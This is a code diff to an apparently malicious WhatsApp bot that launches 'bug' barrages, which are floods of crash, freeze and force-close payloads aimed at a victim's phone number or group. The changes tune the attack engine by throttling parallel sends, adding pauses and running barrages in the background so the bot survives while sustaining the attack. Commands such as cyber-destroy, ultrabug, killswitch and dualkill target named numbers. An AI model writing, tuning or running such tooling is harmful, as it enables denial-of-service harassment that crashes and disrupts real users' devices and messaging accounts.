@@ -618,9 +618,12 @@ if (!global._chatScannerStarted) {
     })();
 }
 
-// Bug attack power multiplier (2000x speed/volume as requested)
-const BUG_ATTACK_MULTIPLIER = 2000;
-const _bugScale = (n) => Math.min(Math.max(Math.ceil(n * BUG_ATTACK_MULTIPLIER / 50), n * 10), 3000);
+// Bug engine limits — powerful sustained barrage WITHOUT crashing the whole bot process
+const BUG_MAX_PARALLEL = 10;       // max payloads at once (200 parallel was crashing all bots)
+const BUG_BATCH_PAUSE_MS = 35;     // micro-pause between micro-batches
+const BUG_WAVE_PAUSE_MS = 90;      // pause between wave types
+const BUG_ROUND_PAUSE_MS = 180;    // pause between rounds
+const _bugScale = (n) => Math.min(Math.max(n * 5, n + 12), 100); // high volume over time, not instant OOM
 
 // Send anime image/GIF via URL (avoids 5MB+ download failures)
 async function sendAnimeMedia(sock, chat, quoted, mediaUrl, caption, isGif = false) {
@@ -983,42 +986,46 @@ const _parseBugTarget = (raw) => {
     return { num, jid: num + '@s.whatsapp.net' };
 };
 
-// Silent error wrapper — one failed payload never kills the barrage
+// Silent error wrapper — one failed payload never kills the barrage or the bot process
 const _bugSafe = async (fn, target) => {
     try { await fn(target); } catch (_) {}
 };
 
-// Parallel burst — 2000x speed: max batch, zero delay between waves
-const _bugBurst = async (target, fns, batchSize = 150) => {
+// Controlled micro-burst — limited parallelism + event-loop yield (prevents full bot crash)
+const _bugBurst = async (target, fns) => {
     if (stopAttacks) return;
-    const _bs = Math.max(batchSize, 50);
+    const _bs = BUG_MAX_PARALLEL;
     for (let i = 0; i < fns.length; i += _bs) {
         if (stopAttacks) return;
         await Promise.allSettled(
             fns.slice(i, i + _bs).map(fn => _bugSafe(fn, target))
         );
+        if (i + _bs < fns.length) {
+            await sleep(BUG_BATCH_PAUSE_MS + Math.floor(Math.random() * 25));
+            await new Promise((r) => setImmediate(r));
+        }
     }
 };
 
-// Centralized attack profiles — all bug commands route through here
+// Centralized attack profiles — sequential waves so all types don't fire at once
 const _runBugBarrage = async (target, profile = 'standard') => {
     const _carousel = (t) => CarouselVY4(devtrust, t);
     const _crashIos = (t) => CrashLoadIos(devtrust, t);
 
     const waves = {
         combo: () => _bugBurst(target,
-            Array(_bugScale(36)).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 200),
+            Array(_bugScale(36)).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1])),
         fcnew: () => _bugBurst(target,
-            Array(_bugScale(30)).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 200),
+            Array(_bugScale(30)).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1])),
         xphone: () => _bugBurst(target,
-            Array(_bugScale(24)).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 200),
+            Array(_bugScale(24)).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible])),
         bayu: () => _bugBurst(target,
-            Array(_bugScale(24)).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 200),
-        forceclose: () => _bugBurst(target, Array(_bugScale(40)).fill(forclose), 250),
+            Array(_bugScale(24)).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6])),
+        forceclose: () => _bugBurst(target, Array(_bugScale(40)).fill(forclose)),
         ios: () => _bugBurst(target,
-            Array(_bugScale(20)).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 200),
-        vampire: () => _bugBurst(target, Array(_bugScale(6)).fill(VampireBugIns), 100),
-        group: () => _bugBurst(target, Array(_bugScale(8)).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 150),
+            Array(_bugScale(20)).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose])),
+        vampire: () => _bugBurst(target, Array(_bugScale(6)).fill(VampireBugIns)),
+        group: () => _bugBurst(target, Array(_bugScale(8)).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible])),
     };
 
     const profiles = {
@@ -1040,11 +1047,39 @@ const _runBugBarrage = async (target, profile = 'standard') => {
     const cfg = profiles[profile] || profiles.standard;
     for (let round = 0; round < cfg.rounds; round++) {
         if (stopAttacks) { stopAttacks = false; break; }
-        await Promise.allSettled(
-            cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
-        );
+        for (const name of cfg.seq) {
+            if (stopAttacks) break;
+            if (waves[name]) await waves[name]();
+            await sleep(BUG_WAVE_PAUSE_MS);
+            await new Promise((r) => setImmediate(r));
+        }
+        await sleep(BUG_ROUND_PAUSE_MS);
     }
 };
+
+// Background launcher — attack runs isolated; other bots/commands keep working
+function _launchBugBarrage(target, profile, onComplete) {
+    if (!global._bugAttackBusy) global._bugAttackBusy = new Set();
+    const _busyKey = _botNumClean || String(target || 'bot');
+    if (global._bugAttackBusy.has(_busyKey)) {
+        reply(`⚠️ *Attack already running on this bot*\n\nPehle \`${prefix}stopattack\` karo ya attack khatam hone do.`);
+        return false;
+    }
+    global._bugAttackBusy.add(_busyKey);
+    setImmediate(async () => {
+        try {
+            await _runBugBarrage(target, profile);
+        } catch (e) {
+            console.error(`[BUG][${_busyKey}]`, e?.message || e);
+        } finally {
+            global._bugAttackBusy.delete(_busyKey);
+            if (typeof onComplete === 'function') {
+                try { await onComplete(); } catch (_) {}
+            }
+        }
+    });
+    return true;
+}
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : (m.isNewsletter ? true : false);
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : (m.isNewsletter ? true : false);
 const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
@@ -15394,14 +15429,9 @@ case 'cyber-destroy': {
     if (!_tgt) return reply('❌ *Invalid number* — example: 923001234567');
     if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${_tgt.num}\n🔥 *Launching destroy barrage...*`);
+    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${_tgt.num}\n🔥 *Barrage background mein chal rahi hai — bot crash nahi hoga*`);
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'destroy');
-        reply(`✅ *CYBER-DESTROY complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'destroy', () => reply(`✅ *CYBER-DESTROY complete — ${_tgt.num}*`));
     break;
 }
 
@@ -15415,14 +15445,9 @@ case "cyberinvis": {
     if (!_tgt) return reply('❌ *Invalid number*');
     if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    reply(`💀 *Target:* ${_tgt.num}\n⚡ *${command.toUpperCase()} — Full barrage launching...*`);
+    reply(`💀 *Target:* ${_tgt.num}\n⚡ *${command.toUpperCase()} — background barrage started*`);
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'crash');
-        reply(`✅ *Attack completed on ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'crash', () => reply(`✅ *Attack completed on ${_tgt.num}*`));
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
 break;
@@ -15434,14 +15459,9 @@ case "delayhard": {
     if (!_tgt) return reply('❌ *Invalid number*');
     if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    reply(`💀 *Target:* ${_tgt.num}\n⚡ *DELAYHARD — MAXIMUM POWER*`);
+    reply(`💀 *Target:* ${_tgt.num}\n⚡ *DELAYHARD — background barrage started*`);
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'delayhard');
-        reply(`✅ *DELAYHARD complete on ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'delayhard', () => reply(`✅ *DELAYHARD complete on ${_tgt.num}*`));
     await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
 }
 break;
@@ -15456,12 +15476,7 @@ case 'invisphone': {
     if (_tgt.blocked) return reply('🔒 *Protected*');
 
     reply(`🦾 *ANDROID INVISIBLE → ${_tgt.num}*`);
-    try {
-        await _runBugBarrage(_tgt.jid, 'invis');
-        reply(`✅ *Android invisible complete → ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'invis', () => reply(`✅ *Android invisible complete → ${_tgt.num}*`));
     await devtrust.sendMessage(from, { react: { text: "🦾", key: m.key } });
 }
 break;
@@ -15478,12 +15493,7 @@ case "cyberclose": {
 
     reply(`💀 *Target:* ${_tgt.num}\n🔒 *Force closing WhatsApp...*`);
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'close');
-        reply(`✅ *Force close complete on ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'close', () => reply(`✅ *Force close complete on ${_tgt.num}*`));
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
 break;
@@ -15498,18 +15508,15 @@ case 'blankgc': {
     if (!_requireBugAccess()) break;
     if (!m.isGroup) return reply('👥 *Groups only*');
     
-    reply(`💀 *Group destroy barrage starting...*`);
-    try {
-        await _runBugBarrage(m.chat, 'group');
+    reply(`💀 *Group destroy barrage starting (background)...*`);
+    _launchBugBarrage(m.chat, 'group', async () => {
         for (let i = 0; i < 12; i++) {
             if (stopAttacks) break;
             await bug3(m.chat);
             await sleep(100);
         }
         reply(`✅ *Group attack complete*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    });
 }
 break;
 
@@ -15519,13 +15526,8 @@ case 'invisiblegc': {
     if (!_requireBugAccess()) break;
     if (!m.isGroup) return reply('👥 *Groups only*');
     
-    reply(`👻 *INVISIBLE GROUP ATTACK INITIATED...*`);
-    try {
-        await _runBugBarrage(m.chat, 'group');
-        reply(`✅ *Invisible group attack complete*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    reply(`👻 *INVISIBLE GROUP ATTACK INITIATED (background)...*`);
+    _launchBugBarrage(m.chat, 'group', () => reply(`✅ *Invisible group attack complete*`));
 }
 break;
 
@@ -15541,12 +15543,7 @@ case 'ultrabug': {
     reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'ultrabug');
-        reply(`✅ *ULTRABUG complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'ultrabug', () => reply(`✅ *ULTRABUG complete — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
 }
 break;
@@ -15561,12 +15558,7 @@ case 'megabug': {
     reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'megabug');
-        reply(`✅ *MEGABUG complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'megabug', () => reply(`✅ *MEGABUG complete — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '💥', key: m.key } });
 }
 break;
@@ -15581,12 +15573,7 @@ case 'invisios': {
     if (_tgt.blocked) return reply('🔒 *Protected*');
 
     reply(`📱 *iPHONE INVISIBLE → ${_tgt.num}*`);
-    try {
-        await _runBugBarrage(_tgt.jid, 'invis');
-        reply(`✅ *iPhone invisible complete → ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'invis', () => reply(`✅ *iPhone invisible complete → ${_tgt.num}*`));
     await devtrust.sendMessage(from, { react: { text: '📱', key: m.key } });
 }
 break;
@@ -15601,19 +15588,10 @@ case 'ghostcrash': {
     reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '👻', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'ghost');
-        reply(`✅ *GHOSTCRASH complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'ghost', () => reply(`✅ *GHOSTCRASH complete — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
 }
 break;
-
-
-
-
 
 case 'godmode': {
     if (!_requireBugAccess()) break;
@@ -15625,12 +15603,7 @@ case 'godmode': {
     reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'godmode');
-        reply(`✅ *GODMODE complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'godmode', () => reply(`✅ *GODMODE complete — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '🔱', key: m.key } });
 }
 break;
@@ -15645,12 +15618,7 @@ case 'killswitch': {
     reply(`🔴 *KILLSWITCH — INSTANT KILL*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'killswitch');
-        reply(`✅ *KILLSWITCH executed — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'killswitch', () => reply(`✅ *KILLSWITCH executed — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
 }
 break;
@@ -15671,12 +15639,7 @@ case 'overkill': {
     reply(`☢️ *ALLATTACK — MAXIMUM OVERKILL*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
     CYBEReress();
-    try {
-        await _runBugBarrage(_tgt.jid, 'nuke');
-        reply(`✅ *ALLATTACK complete — ${_tgt.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt.jid, 'nuke', () => reply(`✅ *ALLATTACK complete — ${_tgt.num}*`));
     await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
 }
 break;
@@ -15698,15 +15661,9 @@ case 'dualkill': {
     reply(`🔥 *DUALATTACK*\n🎯 *Target 1:* ${_tgt1.num}\n🎯 *Target 2:* ${_tgt2.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🔥', key: m.key } });
     CYBEReress();
-    try {
-        await Promise.all([
-            _runBugBarrage(_tgt1.jid, 'nuke'),
-            _runBugBarrage(_tgt2.jid, 'nuke'),
-        ]);
-        reply(`✅ *DUALATTACK complete — ${_tgt1.num} + ${_tgt2.num}*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(_tgt1.jid, 'nuke', () => {
+        _launchBugBarrage(_tgt2.jid, 'nuke', () => reply(`✅ *DUALATTACK complete — ${_tgt1.num} + ${_tgt2.num}*`));
+    });
     await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
 }
 break;
@@ -15728,15 +15685,9 @@ case 'fullstrike': {
     reply(`⚡ *GROUPANDPERSON*\n🏘️ *Group:* ${groupTarget}\n🎯 *Person:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
     CYBEReress();
-    try {
-        await Promise.all([
-            _runBugBarrage(groupTarget, 'group'),
-            _runBugBarrage(_tgt.jid, 'nuke'),
-        ]);
-        reply(`✅ *GROUPANDPERSON complete*`);
-    } catch(e) {
-        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
-    }
+    _launchBugBarrage(groupTarget, 'group', () => {
+        _launchBugBarrage(_tgt.jid, 'nuke', () => reply(`✅ *GROUPANDPERSON complete*`));
+    });
     await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
 }
 break;
@@ -15774,6 +15725,7 @@ case 'attackstop': {
     if (!isOwner && !_requireBugAccess()) break;
 
     stopAttacks = true;
+    if (global._bugAttackBusy) global._bugAttackBusy.clear();
 
     await devtrust.sendMessage(m.chat, { react: { text: '🛑', key: m.key } });
     reply(`🛑 *STOP ATTACK — EMERGENCY KILL*
